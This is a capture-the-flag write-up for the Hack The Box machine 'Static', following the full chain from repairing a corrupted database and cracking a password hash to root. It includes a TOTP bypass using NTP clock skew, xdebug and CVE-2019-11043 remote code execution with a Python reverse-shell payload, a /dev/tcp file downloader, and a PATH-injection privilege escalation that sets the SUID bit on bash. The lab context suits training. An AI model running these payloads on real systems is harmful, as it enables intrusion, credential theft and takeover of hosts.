> Author: **[ompamo][author-profile]**

## Discovery

### Port Scanning

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
```

```bash
PORT    STATE SERVICE
123/udp open  ntp
```

### Web Browsing

`http://10.10.10.246:8080` is blank ?!

Still there's a `robots.txt` file:

```
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

There's a compresed database, and a warning:

```
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

Indeed:

```bash
gunzip db.sql.gz
# gzip: db.sql.gz: invalid compressed data--crc error
# gzip: db.sql.gz: invalid compressed data--length error
```

## Break-in

### Mining the Archive

The corrupted archive can be fixed with [`fixgz`][fixgz], the official recovery tool
from gzip:

```bash
git clone https://github.com/yonjar/fixgz && cd fixgz
g++ fixgz.cpp -o fixgz
./fixgz db.sql.gz db.sql.fixed.gz
gunzip db.sql.fixed.gz && mv db.sql.fixed db.sql
cat db.sql
# INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Next:

```bash
hashid d033e22ae348aeb5660fc2140aec35850c4da997
# [+] SHA-1
# [+] Double SHA-1
# [+] RIPEMD-160
# [+] Haval-160
# [+] Tiger-160
# [+] HAS-160
# [+] LinkedIn
# [+] Skein-256(160)
# [+] Skein-512(160)
hash-identifier d033e22ae348aeb5660fc2140aec35850c4da997
# Possible Hashs:
# [+] SHA-1
# [+] MySQL5 - SHA-1(SHA-1($pass))

# Least Possible Hashs:
# [+] Tiger-160
# [+] Haval-160
# [+] RipeMD-160
# [+] SHA-1(HMAC)
# [+] Tiger-160(HMAC)
# [+] RipeMD-160(HMAC)
# [+] Haval-160(HMAC)
# [+] SHA-1(MaNGOS)
# [+] SHA-1(MaNGOS2)
# [+] sha1($pass.$salt)
# [+] sha1($salt.$pass)
# [+] sha1($salt.md5($pass))
# [+] sha1($salt.md5($pass).$salt)
# [+] sha1($salt.sha1($pass))
# [+] sha1($salt.sha1($salt.sha1($pass)))
# [+] sha1($username.$pass)
# [+] sha1($username.$pass.$salt)
# [+] sha1(md5($pass))
# [+] sha1(md5($pass).$salt)
# [+] sha1(md5(sha1($pass)))
# [+] sha1(sha1($pass))
# [+] sha1(sha1($pass).$salt)
# [+] sha1(sha1($pass).substr($pass,0,3))
# [+] sha1(sha1($salt.$pass))
# [+] sha1(sha1(sha1($pass)))
# [+] sha1(strtolower($username).$pass)
john -w /usr/share/wordlists/passwords/rockyou-70.txt admin.hash
```

> admin admin...

### Bypassing 2FA

These credentials work on `http://10.10.10.246:8080/vpn/login.php`, but the
server asks for a 2FA code.

Hopefully the DB provided `totp`, the secret for the OTP generation. More
precisely a time based OTP, TOTP.


The PHP module [otphp][otphp] can process the secret and output a OTP, but
it fails when entered.

I tried several methods and they all failed until I scrolled this very doc
and noticed the NTP service on the UDP scan: the OTP is framed in time and
my clock wasn't synchronized...

Since my machine won't sync with the server, another solution is to input the
time delta with the server manually when generating the OTP.

```bash
ntpdate -vd 10.10.10.246
#  6 Nov 10:55:24 ntpdate[4259]: ntpdate 4.2.8p15@1.3728-o Wed Jul  1 17:02:17 UTC 2020 (1)
# Looking for host 10.10.10.246 and service ntp
# 10.10.10.246 reversed to static.htb
# host found : static.htb
# transmit(10.10.10.246)
# receive(10.10.10.246)
# 10.10.10.246: Server dropped: strata too high
# stratum 16, precision -24, leap 11, trust 000
# refid [INIT], root delay 0.000000, root dispersion 0.040192
# reference time:      (no time)
# originate timestamp: e531074e.727fed58  Sat, Nov  6 2021 14:53:18.447
# transmit timestamp:  e53103b8.2692fc06  Sat, Nov  6 2021 14:38:00.150
# filter delay:  0.18254    0.22990    0.09621    0.09340
#                ----       ----       ----       ----
# filter offset: +918.23436 +918.30527 +918.26238 +918.26256
#                ----       ----       ----       ----
# delay 0.09340, dispersion 0.01247, offset +918.262565
 cat otp.php
# <?php
# include 'otphp/lib/otphp.php';

# $totp = new \OTPHP\TOTP("orxxi4c7orxwwzlo");
# echo $totp->at(time() + 918.23436);
# ?>
php otp.php | xclip -sel clipboard
```

Another solution I tried was to manually add the clock delta to my system time:

```bash
sudo timedatectl set-time $(date -d "@$(( $(date +%s) + 918))" +"%T")
```

A detail that took most of my time...

## User Access

We download the "web" VPN and add the corresponding `vpn.static.htb`.

At first it failed with:

```
2021-11-06 19:44:04 failed to find GID for group nogroup
2021-11-06 19:44:04 Exiting due to fatal error
```

This fixed it:

```bash
perl -pe "s#group nogroup#group nobody#g" web.ovpn
```

The listed IPs are not yet linked to the VPN device:

```bash
ip address
# 8: tun9: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
#     link/none
#     inet 172.30.0.9/16 scope global tun9
#        valid_lft forever preferred_lft forever
#     inet6 fe80::ff:1b39:830:7858/64 scope link stable-privacy
#        valid_lft forever preferred_lft forever
sudo ip route add 172.20.0.0/24 dev tun9
```

Then an internal webserver is exposed:

![][phpinfo]

The module `xdebug` can be exploited thanks to the [MSF module from Rapid7][xdebug-rce]:

```bash
set rhosts 172.20.0.10
set path /vpn/login.php
set lhost tun9
run
shell
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
cat /home/www-data/.ssh/id_rsa
```

```bash
chmod 600 id_rsa.www-data
ssh -i credentials/id_rsa.www-data www-data@10.10.10.246
```

```bash
cat /etc/passwd | grep -via nologin
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# www-data:x:33:33:www-data:/home/www-data:/bin/bash
```

## Moving on to PKI

Going back to the `/vpn`, there's a new domain:

![][pki-domain]

It is accessible from `eth1` to the user www-data:

```bash
ip address
# eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
#         inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
#         ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
#         RX packets 11570  bytes 1948661 (1.9 MB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 17260  bytes 6873724 (6.8 MB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
wget http://192.168.254.3/
cat index.html
# batch mode: /usr/bin/ersatool create|print|revoke CN
```

It can also be forwarded:

```bash
ssh -p 2222 -i credentials/id_rsa.www-data -L 8080:192.168.254.3:80 www-data@10.10.10.246
```

More info:

```bash
wget -SO - http://192.168.254.3/
# HTTP request sent, awaiting response...
#   HTTP/1.1 200 OK
#   Server: nginx/1.14.0 (Ubuntu)
#   Date: Sun, 07 Nov 2021 17:05:58 GMT
#   Content-Type: text/html; charset=UTF-8
#   Transfer-Encoding: chunked
#   Connection: keep-alive
#   X-Powered-By: PHP/7.1.33dev
# Length: unspecified [text/html]
```

And `7.1.33` has a [RCE vulnerability][cve-2019-11043]! We'll exploit it from
`www-data@192.168.254.2`.

First step is to equip the relay:

```bash
scp -i credentials/id_rsa.www-data -P 2222 www/exploit.py www-data@10.10.10.246:/tmp
scp -i credentials/id_rsa.www-data -P 2222 www/rshell.py www-data@10.10.10.246:/tmp
scp -i credentials/id_rsa.www-data -P 2222 www/nc www-data@10.10.10.246:/tmp
ssh -i credentials/id_rsa.www-data -p 2222 www-data@10.10.10.246
```

Where the payload is:

```python
import requests
payload = '/usr/bin/python3.6 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
r = requests.get("http://192.168.254.3/index.php?a="+payload)
print(r.text)
```

Then start a listener with Netcat and run:

```bash
python3 exploit.py --url http://192.168.254.3/index.php
python3 rshell.py 9999
```

This grants access to the `pki` machine:

```bash
hostname
# pki
```

## Escalation

### Finding the Vector

The processes and sockets look boring.

Let's find the binary mentioned in the earlier request: `ersatool`.

```bash
find / -name '*ersatool*' 2>/dev/null
# /usr/src/ersatool.c
# /usr/bin/ersatool
cp /usr/src/ersatool.c /var/www/html/uploads/
cp /usr/bin/ersatool /var/www/html/uploads/
```

And from `192.168.254.2` or `web`:

```bash
cd /tmp
wget http://192.168.254.3/uploads/ersatool
wget http://192.168.254.3/uploads/ersatool.c
```

And exfiltrate the files with `sftp`.

### Static Analysis

This tool makes a system call:

```c
if(pid==0){
    char *a[] = {EASYRSA,"build-client-full",strtok(basename(buffer),"\n"),"nopass","batch"};
    //forge the command string
    cleanStr(a[2]);
    sprintf(CMD,"%s %s %.20s %s %s",a[0],a[1],a[2],a[3],a[4]);
    sout=dup(STDOUT_FILENO);
    serr=dup(STDERR_FILENO);
    devNull=open("/dev/null",O_WRONLY);
    dup2(devNull,STDOUT_FILENO);
    dup2(devNull,STDERR_FILENO);
    setuid(0); //escalating privilges to generate required files
    chdir(ERSA_DIR);
    system(CMD);
}
```

To execute some `easyrsa` binary.

### Dynamic Analysis

In order to inspect the execution of ersatool (easy RSA tool), we'll need two
remote connections to `pki`: one to run ersatool and the other for `pspy`.

On the attacking box:

```bash
bash www/stage.sh
ssh -i credentials/id_rsa.www-data -p 2222 www-data@10.10.10.246
```

On the "web" box:

```bash
cd /tmp
python3 exploit.py --url http://192.168.254.3/index.php
python3 rshell.py 9999
python3 -m http.server 8888
```

On the first "pki" box:

```bash
__curl() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3

  while IFS= read -r line ; do
      [[ "$line" == $'\r' ]] && break
  done <&3

  # read the data
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}
__curl http://192.168.254.2:8888/pspy > pspy
chmod +x pspy
./pspy | tee pspy.log
# 2021/11/08 13:06:28 CMD: UID=33   PID=1952   | ersatool
# 2021/11/08 13:06:33 CMD: UID=0    PID=1954   | sh -c /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1953   | ersatool
# 2021/11/08 13:06:33 CMD: UID=0    PID=1955   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1956   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`ChangeMe`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
# 2021/11/08 13:06:33 CMD: UID=0    PID=1957   |
# 2021/11/08 13:06:33 CMD: UID=0    PID=1958   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1959   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
# 2021/11/08 13:06:33 CMD: UID=0    PID=1960   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
# 2021/11/08 13:06:33 CMD: UID=???  PID=1961   | ???
# 2021/11/08 13:06:33 CMD: UID=0    PID=1963   | openssl req -utf8 -new -newkey rsa:2048 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -keyout /opt/easyrsa/pki/private/a.key.zRiHEB544P -out /opt/easyrsa/pki/reqs/a.req.UfqNe1Iwvd -nodes -batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1964   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1965   | mv /opt/easyrsa/pki/reqs/a.req.UfqNe1Iwvd /opt/easyrsa/pki/reqs/a.req
# 2021/11/08 13:06:33 CMD: UID=0    PID=1966   | openssl rand -hex -out /opt/easyrsa/pki/serial 16
# 2021/11/08 13:06:33 CMD: UID=0    PID=1967   |
# 2021/11/08 13:06:33 CMD: UID=0    PID=1968   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1969   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1970   | openssl req -in /opt/easyrsa/pki/reqs/a.req -noout
# 2021/11/08 13:06:33 CMD: UID=0    PID=1971   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1972   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1973   | cat /opt/easyrsa/x509-types/COMMON
# 2021/11/08 13:06:33 CMD: UID=???  PID=1974   | ???
# 2021/11/08 13:06:33 CMD: UID=0    PID=1976   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1977   |
# 2021/11/08 13:06:33 CMD: UID=0    PID=1978   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1979   | mktemp /opt/easyrsa/pki/issued/a.crt.XXXXXXXXXX
# 2021/11/08 13:06:33 CMD: UID=0    PID=1980   | openssl ca -utf8 -in /opt/easyrsa/pki/reqs/a.req -out /opt/easyrsa/pki/issued/a.crt.Iiokwrm6t4 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch
# 2021/11/08 13:06:33 CMD: UID=0    PID=1981   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
```

On the second "pki" box:

```bash
ersatool
```

### PATH Injection

The idea is to modify the `$PATH` environment variable to point `openssl` to
a custom script that'll set the UID bit on `/bin/bash`.

The target has very limited tools, so we'll have to do with bash to download
the relevant files on the box.

```bash
echo -ne '#!/bin/bash\nchmod u+s /bin/bash\n' | base64 -w0
# IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=
```

```bash
mkdir /tmp/pwn && cd /tmp/pwn
echo -n 'IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=' | base64 -d > openssl
chmod 755 openssl
export PATH=/tmp/pwn:$PATH
ersatool
# create a
# exit
/bin/bash -p
cat /etc/shadow | grep -ia root
# root:*:18332:0:99999:7:::
cat /root/notes.txt
# Resources used for creation of this box:

# https://github.com/lfkeitel/php-totp
# https://github.com/gteissier/xdebug-shell
# https://github.com/neex/phuip-fpizdam
```

[author-profile]: https://app.hackthebox.com/users/9631

[cve-2019-11043]: https://github.com/theMiddleBlue/CVE-2019-11043
[otphp]: https://github.com/lelag/otphp
[fixgz]: https://github.com/yonjar/fixgz
[phpinfo]: images/screenshots/phpinfo.png
[pki-domain]: images/screenshots/pki.png
[xdebug-rce]: https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/
